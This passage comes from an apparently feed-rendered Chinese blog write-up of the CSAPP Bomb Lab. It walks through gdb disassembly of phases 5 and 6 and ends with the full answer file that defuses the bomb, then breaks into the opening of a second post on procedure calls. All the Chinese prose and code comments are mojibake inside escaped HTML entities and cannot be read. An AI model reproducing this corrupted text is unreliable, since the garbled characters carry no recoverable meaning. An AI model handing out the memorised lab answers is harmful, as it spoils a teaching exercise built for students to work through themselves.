   0x0000000000401082 &amp;lt;+32&amp;gt;:    je     0x4010d2 &amp;lt;phase_5+112&amp;gt;
   0x0000000000401084 &amp;lt;+34&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401089 &amp;lt;+39&amp;gt;:    jmp    0x4010d2 &amp;lt;phase_5+112&amp;gt;
   0x000000000040108b &amp;lt;+41&amp;gt;:    movzbl (%rbx,%rax,1),%ecx           # ç¬¬%raxå­—ç¬¦
   0x000000000040108f &amp;lt;+45&amp;gt;:    mov    %cl,(%rsp)
   0x0000000000401092 &amp;lt;+48&amp;gt;:    mov    (%rsp),%rdx
   0x0000000000401096 &amp;lt;+52&amp;gt;:    and    $0xf,%edx                    # åªå–ä½4ä½
   0x0000000000401099 &amp;lt;+55&amp;gt;:    movzbl 0x4024b0(%rdx),%edx          # 0x4024b0+è¿™4ä½çš„å†…å­˜çš„å€¼å­˜å‚¨åˆ°%edx
   0x00000000004010a0 &amp;lt;+62&amp;gt;:    mov    %dl,0x10(%rsp,%rax,1)        # 
   0x00000000004010a4 &amp;lt;+66&amp;gt;:    add    $0x1,%rax
   0x00000000004010a8 &amp;lt;+70&amp;gt;:    cmp    $0x6,%rax
   0x00000000004010ac &amp;lt;+74&amp;gt;:    jne    0x40108b &amp;lt;phase_5+41&amp;gt;
   0x00000000004010ae &amp;lt;+76&amp;gt;:    movb   $0x0,0x16(%rsp)
   0x00000000004010b3 &amp;lt;+81&amp;gt;:    mov    $0x40245e,%esi
   0x00000000004010b8 &amp;lt;+86&amp;gt;:    lea    0x10(%rsp),%rdi
   0x00000000004010bd &amp;lt;+91&amp;gt;:    call   0x401338 &amp;lt;strings_not_equal&amp;gt; # ä»%rdiå¼€å§‹çš„å­—ç¬¦ä¸²ä¸0x401338çš„å­—ç¬¦ä¸²æ¯”è¾ƒ
   0x00000000004010c2 &amp;lt;+96&amp;gt;:    test   %eax,%eax                    # ç›¸åŒè¿”å›0
   0x00000000004010c4 &amp;lt;+98&amp;gt;:    je     0x4010d9 &amp;lt;phase_5+119&amp;gt;
   0x00000000004010c6 &amp;lt;+100&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00000000004010cb &amp;lt;+105&amp;gt;:   nopl   0x0(%rax,%rax,1)
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00000000004010d0 &amp;lt;+110&amp;gt;:   jmp    0x4010d9 &amp;lt;phase_5+119&amp;gt;
   0x00000000004010d2 &amp;lt;+112&amp;gt;:   mov    $0x0,%eax
   0x00000000004010d7 &amp;lt;+117&amp;gt;:   jmp    0x40108b &amp;lt;phase_5+41&amp;gt;
   0x00000000004010d9 &amp;lt;+119&amp;gt;:   mov    0x18(%rsp),%rax
   0x00000000004010de &amp;lt;+124&amp;gt;:   xor    %fs:0x28,%rax
   0x00000000004010e7 &amp;lt;+133&amp;gt;:   je     0x4010ee &amp;lt;phase_5+140&amp;gt;
   0x00000000004010e9 &amp;lt;+135&amp;gt;:   call   0x400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x00000000004010ee &amp;lt;+140&amp;gt;:   add    $0x20,%rsp
   0x00000000004010f2 &amp;lt;+144&amp;gt;:   pop    %rbx
   0x00000000004010f3 &amp;lt;+145&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œå‡ºç°äº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   0x000000000040106a &amp;lt;+8&amp;gt;:     mov    %fs:0x28,%rax
   0x0000000000401073 &amp;lt;+17&amp;gt;:    mov    %rax,0x18(%rsp)
   ...
   0x00000000004010de &amp;lt;+124&amp;gt;:   xor    %fs:0x28,%rax
   0x00000000004010e7 &amp;lt;+133&amp;gt;:   je     0x4010ee &amp;lt;phase_5+140&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è™½ç„¶ä¸è§£å¼€ç‚¸å¼¹æ— å…³,ä½†ç»è¿‡æŸ¥é˜…èµ„æ–™åäº†è§£åˆ°&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸ºäº†è®¿é—®ç‰¹æ®Šçš„æ“ä½œç³»ç»Ÿæ•°æ®ç»“æ„ï¼Œ&lt;code&gt;FS&lt;/code&gt;å’Œ&lt;code&gt;GS&lt;/code&gt;å¯„å­˜å™¨éƒ½å¯ä»¥ç”¨ä½œåŸºå‡†æŒ‡é’ˆåœ°å€ã€‚å› æ­¤ï¼Œæ‚¨æ‰€çœ‹åˆ°çš„æ˜¯ä»&lt;code&gt;FS&lt;/code&gt;å¯„å­˜å™¨ä¸­æŒæœ‰çš„å€¼åŠ è½½åˆ°åç§»é‡å¤„çš„å€¼ï¼Œè€Œä¸æ˜¯å¯¹&lt;code&gt;FS&lt;/code&gt;å¯„å­˜å™¨å†…å®¹çš„ä½æ“ä½œã€‚
å…·ä½“è€Œè¨€ï¼Œåœ¨Linuxä¸Šçš„&lt;code&gt;FS:0x28&lt;/code&gt;æ­£åœ¨å­˜å‚¨ä¸€ä¸ªç‰¹æ®Šçš„å“¨å…µå †æ ˆä¿æŠ¤å€¼ï¼Œè€Œä»£ç æ­£åœ¨æ‰§è¡Œå †æ ˆä¿æŠ¤æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¿›ä¸€æ­¥æŸ¥çœ‹ä»£ç ï¼Œæ‚¨å°†çœ‹åˆ°&lt;code&gt;FS:0x28&lt;/code&gt;ä¸­çš„å€¼å­˜å‚¨åœ¨å †æ ˆä¸Šï¼Œç„¶åä¼šå¬å›å †æ ˆçš„å†…å®¹ï¼Œå¹¶åœ¨&lt;code&gt;FS:0x28&lt;/code&gt;å¤„ä½¿ç”¨åŸå§‹å€¼æ‰§è¡Œ&lt;code&gt;XOR&lt;/code&gt;ã€‚å¦‚æœè¿™ä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œè¿™æ„å‘³ç€ç”±äº&lt;code&gt;XOR&lt;/code&gt;â€˜å¯¹ä¸¤ä¸ªç›¸åŒçš„å€¼ä¸­çš„ä¸¤ä¸ªå€¼äº§ç”Ÿé›¶å€¼è€Œè®¾ç½®äº†é›¶ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è·³åˆ°&lt;code&gt;test&lt;/code&gt;ä¾‹ç¨‹ï¼Œå¦åˆ™æˆ‘ä»¬è·³è½¬åˆ°ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æŒ‡ç¤ºå †æ ˆä»¥æŸç§æ–¹å¼æŸåï¼Œå¹¶ä¸”å­˜å‚¨åœ¨å †æ ˆä¸Šçš„å‰å“¨å€¼è¢«æ›´æ”¹ã€‚
é¦–å…ˆinputçš„string_lengthæ˜¯6.ç„¶åå¾ªç¯6æ­¤è¯»å–è¾“å…¥çš„å­—ç¬¦,ä»%rspåˆ°%rsp+5,è½¬æ¢åå­˜å‚¨åˆ°%rsp+0x10åˆ°%rsp+0x15,å¹¶ä¸0x401338çš„å­—ç¬¦ä¸²æ¯”è¾ƒ
æŸ¥çœ‹0x401338&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x40245e
0x40245e:       &amp;quot;flyers&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœç„¶æ˜¯6ä¸ªå­—ç¬¦.
å†æŸ¥çœ‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)  x /s 0x4024b0
0x4024b0 &amp;lt;array.3449&amp;gt;:  &amp;quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”±äºåªæœ‰è¾“å…¥çš„ä½4ä½æœ‰ç”¨,ä¹Ÿå°±æ˜¯è¦ä»å‰15ä¸ªå­—ç¬¦ä¸­å¯»æ‰¾&amp;quot;flyers&amp;quot;.ä¾æ¬¡æ˜¯ 9   15   14   5   6   7
æ‰€ä»¥æœ‰å¤šä¸ªç­”æ¡ˆ,åªè¦å­—ç¬¦çš„ASCIIç å€¼æ¨¡16çš„ä½™æ•°ä¾æ¬¡æ˜¯è¿™6ä¸ªæ•°å°±è¡Œ.ç›´æ¥åœ¨gdbä¸­æ‰“å°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) printf &amp;quot;%c %c %c %c %c %c&amp;quot;,9+64,15+64,14+64,5+64,6+64,7+64
I O N E F G
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨answeræ–‡ä»¶ä¸­åŠ ä¸Šè¿™ä¸€è¡Œ,è¿è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;h1&gt;phase_6&lt;/h1&gt;
&lt;p&gt;æ¥åˆ°æœ€åä¸€ä¸ª!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_6
Dump of assembler code for function phase_6:
   0x00000000004010f4 &amp;lt;+0&amp;gt;:     push   %r14
   0x00000000004010f6 &amp;lt;+2&amp;gt;:     push   %r13
   0x00000000004010f8 &amp;lt;+4&amp;gt;:     push   %r12
   0x00000000004010fa &amp;lt;+6&amp;gt;:     push   %rbp
   0x00000000004010fb &amp;lt;+7&amp;gt;:     push   %rbx
   0x00000000004010fc &amp;lt;+8&amp;gt;:     sub    $0x50,%rsp
   0x0000000000401100 &amp;lt;+12&amp;gt;:    mov    %rsp,%r13
   0x0000000000401103 &amp;lt;+15&amp;gt;:    mov    %rsp,%rsi
   0x0000000000401106 &amp;lt;+18&amp;gt;:    call   0x40145c &amp;lt;read_six_numbers&amp;gt;
   0x000000000040110b &amp;lt;+23&amp;gt;:    mov    %rsp,%r14
   0x000000000040110e &amp;lt;+26&amp;gt;:    mov    $0x0,%r12d
   0x0000000000401114 &amp;lt;+32&amp;gt;:    mov    %r13,%rbp
   0x0000000000401117 &amp;lt;+35&amp;gt;:    mov    0x0(%r13),%eax                  # %r13æ˜¯%rsp
   0x000000000040111b &amp;lt;+39&amp;gt;:    sub    $0x1,%eax                       # 
   0x000000000040111e &amp;lt;+42&amp;gt;:    cmp    $0x5,%eax                       
   0x0000000000401121 &amp;lt;+45&amp;gt;:    jbe    0x401128 &amp;lt;phase_6+52&amp;gt;           # %rsp&amp;lt;=6
   0x0000000000401123 &amp;lt;+47&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401128 &amp;lt;+52&amp;gt;:    add    $0x1,%r12d                      # %r12d+=1
   0x000000000040112c &amp;lt;+56&amp;gt;:    cmp    $0x6,%r12d                      # 1 ~ 5
   0x0000000000401130 &amp;lt;+60&amp;gt;:    je     0x401153 &amp;lt;phase_6+95&amp;gt;           #
   0x0000000000401132 &amp;lt;+62&amp;gt;:    mov    %r12d,%ebx
   0x0000000000401135 &amp;lt;+65&amp;gt;:    movslq %ebx,%rax
   0x0000000000401138 &amp;lt;+68&amp;gt;:    mov    (%rsp,%rax,4),%eax
   0x000000000040113b &amp;lt;+71&amp;gt;:    cmp    %eax,0x0(%rbp)                  # æ¯”è¾ƒç¬¬2ä¸ªåˆ°ç¬¬6ä¸ªæ•°ä¸ç¬¬1ä¸ªæ•°
   0x000000000040113e &amp;lt;+74&amp;gt;:    jne    0x401145 &amp;lt;phase_6+81&amp;gt;           # ä¸èƒ½ç›¸ç­‰
   0x0000000000401140 &amp;lt;+76&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401145 &amp;lt;+81&amp;gt;:    add    $0x1,%ebx
   0x0000000000401148 &amp;lt;+84&amp;gt;:    cmp    $0x5,%ebx
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x000000000040114b &amp;lt;+87&amp;gt;:    jle    0x401135 &amp;lt;phase_6+65&amp;gt;
   0x000000000040114d &amp;lt;+89&amp;gt;:    add    $0x4,%r13
   0x0000000000401151 &amp;lt;+93&amp;gt;:    jmp    0x401114 &amp;lt;phase_6+32&amp;gt;           # æ‰€æœ‰6ä¸ªæ•°å­—éƒ½&amp;lt;=6,å¹¶ä¸”äº’ä¸ç›¸ç­‰,ç»“æŸä»¥ä¸Šå¾ªç¯
   0x0000000000401153 &amp;lt;+95&amp;gt;:    lea    0x18(%rsp),%rsi                 # %rsi=%rsp+24
   0x0000000000401158 &amp;lt;+100&amp;gt;:   mov    %r14,%rax                       # %r14=%rsp=%rax
   0x000000000040115b &amp;lt;+103&amp;gt;:   mov    $0x7,%ecx 
   0x0000000000401160 &amp;lt;+108&amp;gt;:   mov    %ecx,%edx
   0x0000000000401162 &amp;lt;+110&amp;gt;:   sub    (%rax),%edx                     # %edx=7-(%rspç¬¬1ä¸ªæ•´æ•°)
   0x0000000000401164 &amp;lt;+112&amp;gt;:   mov    %edx,(%rax)                     # æ›¿æ¢
   0x0000000000401166 &amp;lt;+114&amp;gt;:   add    $0x4,%rax                       # ä¸‹ä¸€ä¸ªæ•´æ•°
   0x000000000040116a &amp;lt;+118&amp;gt;:   cmp    %rsi,%rax        
   0x000000000040116d &amp;lt;+121&amp;gt;:   jne    0x401160 &amp;lt;phase_6+108&amp;gt;          # å¯¹6ä¸ªæ•´æ•°éƒ½è¿™æ ·æ“ä½œ
   0x000000000040116f &amp;lt;+123&amp;gt;:   mov    $0x0,%esi
   0x0000000000401174 &amp;lt;+128&amp;gt;:   jmp    0x401197 &amp;lt;phase_6+163&amp;gt;
   0x0000000000401176 &amp;lt;+130&amp;gt;:   mov    0x8(%rdx),%rdx                 # %rdx=(%rdx+8) 0x6032d0è¿™æ˜¯ä¸€ä¸ªé“¾è¡¨
   0x000000000040117a &amp;lt;+134&amp;gt;:   add    $0x1,%eax                      # %eaxåˆšåˆ°è¿™é‡Œæ—¶æ˜¯1,ç°åœ¨åŠ 1æ˜¯2
   0x000000000040117d &amp;lt;+137&amp;gt;:   cmp    %ecx,%eax                      # æ¯”è¾ƒ%raxå’Œ
   0x000000000040117f &amp;lt;+139&amp;gt;:   jne    0x401176 &amp;lt;phase_6+130&amp;gt;
   0x0000000000401181 &amp;lt;+141&amp;gt;:   jmp    0x401188 &amp;lt;phase_6+148&amp;gt;
   0x0000000000401183 &amp;lt;+143&amp;gt;:   mov    $0x6032d0,%edx
   0x0000000000401188 &amp;lt;+148&amp;gt;:   mov    %rdx,0x20(%rsp,%rsi,2)         # (%rsp+32/40/...)=0x6032d0
   0x000000000040118d &amp;lt;+153&amp;gt;:   add    $0x4,%rsi
   0x0000000000401191 &amp;lt;+157&amp;gt;:   cmp    $0x18,%rsi                     # 6æ¬¡æ“ä½œ
   0x0000000000401195 &amp;lt;+161&amp;gt;:   je     0x4011ab &amp;lt;phase_6+183&amp;gt;         # 6æ¬¡æ“ä½œ
   0x0000000000401197 &amp;lt;+163&amp;gt;:   mov    (%rsp,%rsi,1),%ecx            # ä¸‹ä¸€ä¸ªæ•´æ•°
   0x000000000040119a &amp;lt;+166&amp;gt;:   cmp    $0x1,%ecx
   0x000000000040119d &amp;lt;+169&amp;gt;:   jle    0x401183 &amp;lt;phase_6+143&amp;gt;        # å¦‚æœä¸€ä¸ªæ•´æ•°æ˜¯1,å®‰æ’é“¾è¡¨å¤´æŒ‡é’ˆ
   0x000000000040119f &amp;lt;+171&amp;gt;:   mov    $0x1,%eax
   0x00000000004011a4 &amp;lt;+176&amp;gt;:   mov    $0x6032d0,%edx
   0x00000000004011a9 &amp;lt;+181&amp;gt;:   jmp    0x401176 &amp;lt;phase_6+130&amp;gt;        # æˆ‘ç®—æ˜¯çœ‹æ˜ç™½äº†,æ•´æ•°æ˜¯å¤šå°‘,å¯¹åº”ä½ç½®å°±æ˜¯æŒ‡å‘é“¾è¡¨ç¬¬å‡ ä¸ªå…ƒç´ çš„åœ°å€
   0x00000000004011ab &amp;lt;+183&amp;gt;:   mov    0x20(%rsp),%rbx              # %rbx = é“¾è¡¨[ç¬¬1ä¸ªæ•´æ•°]çš„åœ°å€
   0x00000000004011b0 &amp;lt;+188&amp;gt;:   lea    0x28(%rsp),%rax              # %rax= é“¾è¡¨[ç¬¬äºŒä¸ªæ•´æ•°]çš„åœ°å€çš„åœ°å€
   0x00000000004011b5 &amp;lt;+193&amp;gt;:   lea    0x50(%rsp),%rsi              # %rsi = é“¾è¡¨[æœ€åä¸€ä¸ªæ•´æ•°]çš„åœ°å€çš„åœ°å€
   0x00000000004011ba &amp;lt;+198&amp;gt;:   mov    %rbx,%rcx                    # %rcx = é“¾è¡¨[ç¬¬ä¸€ä¸ªæ•´æ•°]çš„åœ°å€
   0x00000000004011bd &amp;lt;+201&amp;gt;:   mov    (%rax),%rdx                  # %rdx = é“¾è¡¨[ç¬¬äºŒä¸ªæ•´æ•°]çš„åœ°å€
   0x00000000004011c0 &amp;lt;+204&amp;gt;:   mov    %rdx,0x8(%rcx)               # 
   0x00000000004011c4 &amp;lt;+208&amp;gt;:   add    $0x8,%rax
   0x00000000004011c8 &amp;lt;+212&amp;gt;:   cmp    %rsi,%rax
   0x00000000004011cb &amp;lt;+215&amp;gt;:   je     0x4011d2 &amp;lt;phase_6+222&amp;gt;
   0x00000000004011cd &amp;lt;+217&amp;gt;:   mov    %rdx,%rcx
   0x00000000004011d0 &amp;lt;+220&amp;gt;:   jmp    0x4011bd &amp;lt;phase_6+201&amp;gt;      # é‡æ–°æ’åˆ—äº†è¿™ä¸ªé“¾è¡¨
   0x00000000004011d2 &amp;lt;+222&amp;gt;:   movq   $0x0,0x8(%rdx)              # å°¾æŒ‡é’ˆè®¾ä¸º0
   0x00000000004011da &amp;lt;+230&amp;gt;:   mov    $0x5,%ebp                   # 
   0x00000000004011df &amp;lt;+235&amp;gt;:   mov    0x8(%rbx),%rax              
   0x00000000004011e3 &amp;lt;+239&amp;gt;:   mov    (%rax),%eax
   0x00000000004011e5 &amp;lt;+241&amp;gt;:   cmp    %eax,(%rbx)                 # é“¾è¡¨[ç¬¬1ä¸ªæ•´æ•°]&amp;gt;=é“¾è¡¨[ç¬¬2ä¸ªæ•´æ•°]
   0x00000000004011e7 &amp;lt;+243&amp;gt;:   jge    0x4011ee &amp;lt;phase_6+250&amp;gt;
   0x00000000004011e9 &amp;lt;+245&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00000000004011ee &amp;lt;+250&amp;gt;:   mov    0x8(%rbx),%rbx              # 
   0x00000000004011f2 &amp;lt;+254&amp;gt;:   sub    $0x1,%ebp
   0x00000000004011f5 &amp;lt;+257&amp;gt;:   jne    0x4011df &amp;lt;phase_6+235&amp;gt;      # è¦æ±‚é“¾è¡¨é™åºæ’åˆ—
   0x00000000004011f7 &amp;lt;+259&amp;gt;:   add    $0x50,%rsp
   0x00000000004011fb &amp;lt;+263&amp;gt;:   pop    %rbx
   0x00000000004011fc &amp;lt;+264&amp;gt;:   pop    %rbp
   0x00000000004011fd &amp;lt;+265&amp;gt;:   pop    %r12
   0x00000000004011ff &amp;lt;+267&amp;gt;:   pop    %r13
   0x0000000000401201 &amp;lt;+269&amp;gt;:   pop    %r14
   0x0000000000401203 &amp;lt;+271&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¹ˆå•Š,å¤ªBTäº†www
å“‡å¡,è¿™äº›ä»£ç è™½ç„¶å¾ˆé•¿,ä½†æ˜¯æ‹†åˆ†å¼€æ¥ä¸æ˜¯å¾ˆéš¾.é€»è¾‘æ˜¯è·å–6ä¸ªè¾“å…¥,è¦æ±‚å¤§äº0å°äº7å¹¶ä¸”äº’ä¸ç›¸åŒ.ä¾æ¬¡å»å†…å­˜ä¸­ä¸€ä¸ªåˆ›å»ºå¥½çš„é“¾è¡¨ä¸­å¯»æ‰¾å¯¹åº”åºåˆ—çš„å…ƒç´ å­˜å–åœ¨æ ˆä¸Šå¯¹åº”çš„ä½ç½®(ä¾‹å¦‚ç¬¬2ä¸ªè¾“å…¥æ˜¯3,é‚£ä¹ˆåœ¨æ ˆçš„ç¬¬2ä¸ªæŒ‡é’ˆä½ç½®æ”¾é“¾è¡¨ç¬¬3ä¸ªå…ƒç´ çš„æŒ‡é’ˆ,æ­¤æ—¶%rsp+i*8å°±æ˜¯&amp;quot;æŒ‡é’ˆçš„æŒ‡é’ˆ&amp;quot;,è¿™é‡Œæœ€ç»•).æ¥ç€ä¿®æ”¹é“¾è¡¨ä½¿å…¶é‡æ–°æ’åˆ—.æœ€åè¦æ±‚æ–°é“¾è¡¨é™åºæ’åˆ—å³å¯.
æˆ‘ä»¬æ‰“å°é“¾è¡¨(æŒ‡é’ˆéƒ¨åˆ†)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x6032d8
0x6032d8 &amp;lt;node1+8&amp;gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x6032e8
0x6032e8 &amp;lt;node2+8&amp;gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x6032f8
0x6032f8 &amp;lt;node3+8&amp;gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603308
0x603308 &amp;lt;node4+8&amp;gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603318
0x603318 &amp;lt;node5+8&amp;gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x603328
0x603328 &amp;lt;node6+8&amp;gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(æ•°æ®éƒ¨åˆ†)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x6032d0
0x6032d0 &amp;lt;node1&amp;gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00
(gdb) x /8x 0x6032e0
0x6032e0 &amp;lt;node2&amp;gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00
(gdb) x /8x 0x6032f0
0x6032f0 &amp;lt;node3&amp;gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00
(gdb) x /8x 0x603300
0x603300 &amp;lt;node4&amp;gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00
(gdb) x /8x 0x603310
0x603310 &amp;lt;node5&amp;gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00
(gdb) x /8x 0x603320
0x603320 &amp;lt;node6&amp;gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ—è¡¨å¦‚ä¸‹:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;index&lt;/th&gt;
&lt;th&gt;number&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0x14c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0x0a8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0x39c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;0x2b3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;0x1dd&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;0x1bb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;é™åºæ’åˆ—çš„é¡ºåºä¸º3-&amp;gt;4-&amp;gt;5-&amp;gt;6-&amp;gt;1-&amp;gt;2.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å·®ç‚¹å¿˜äº†,ä»£ç ä¸­æ›¾ç»ç”¨7å‡å»è¾“å…¥çš„æ•°,æ‰€ä»¥æœ€åçš„ç­”æ¡ˆå°±æ˜¯ &lt;code&gt;4 3 2 1 6 5&lt;/code&gt; !&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kim@MyDell:/mnt/e/Documents/C/CSAPP/bomb$ cat answer
Border relations with Canada have never been better.
1 2 4 8 16 32
3 256
0 0
IONEFG
4 3 2 1 6 5
kim@MyDell:/mnt/e/Documents/C/CSAPP/bomb$ ./bomb answer
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You&amp;#39;ve defused the bomb!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‹¿ä¸‹!&lt;/p&gt;
&lt;h1&gt;éšè—å½©è›‹&lt;/h1&gt;
&lt;p&gt;çœ‹åˆ°åˆ«äººçš„è§£ç­”å‘ç°åŸæ¥bombè¿˜æœ‰å½©è›‹,å¹¶æ²¡æœ‰åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨.å¯¹äºæˆ‘è¿™æ ·ç”¨gdbè§æ‹›æ‹†æ‹›çš„é€‰æ‰‹å½“ç„¶æ²¡æœ‰æƒ³åˆ°.åªæœ‰æŠŠæ•´ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åæ±‡ç¼–æ‰èƒ½çœ‹åˆ°,æ¯”å¦‚ä½¿ç”¨objdumpé‡å®šå‘è¾“å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d bomb &amp;gt;&amp;gt; bomb.s
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;æ„Ÿå—&lt;/h1&gt;
&lt;h1&gt;å‚è€ƒèµ„æ–™/è¡¥å……å­¦ä¹ &lt;/h1&gt;
&lt;h2&gt;åˆ«äººçš„è§£æ³•&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/451623574&quot;&gt;æ‰‹æŠŠæ‰‹æ•™ä½ æ‹†è§£ CSAPP çš„ ç‚¸å¼¹å®éªŒå®¤ BombLab - çŸ¥ä¹&lt;/a&gt;
&lt;a href=&quot;https://blog.csdn.net/weixin_52259822/article/details/124219469&quot;&gt;CSAPPï¼šBombLab è¯¦ç»†è§£æ_csapp bomblab-CSDNåšå®¢&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;GDBè°ƒè¯•&lt;/h2&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/451623574&quot;&gt;æ‰‹æŠŠæ‰‹æ•™ä½ æ‹†è§£ CSAPP çš„ ç‚¸å¼¹å®éªŒå®¤ BombLab - çŸ¥ä¹&lt;/a&gt;&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sat, 18 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æœºå™¨çº§ç¼–ç¨‹III(è¿‡ç¨‹)</title><link>https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biii%E8%BF%87%E7%A8%8Bprocedure/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biii%E8%BF%87%E7%A8%8Bprocedure/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biii%E8%BF%87%E7%A8%8Bprocedure/&quot;&gt;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biii%E8%BF%87%E7%A8%8Bprocedure/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;è¿‡ç¨‹çš„æœºåˆ¶&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ä¼ é€’æ§åˆ¶
å½“Pè°ƒç”¨Qæ—¶,ç¨‹åºå¿…é¡»ä»¥æŸç§æ–¹å¼è·³å…¥Qä¸­,æ‰§è¡ŒQçš„ä»£ç ,ç„¶åå½“Qæ‰§è¡Œåˆ°é€€å‡ºæ—¶,ç¨‹åºéœ€è¦ä»¥æŸç§æ–¹å¼å›åˆ°P.
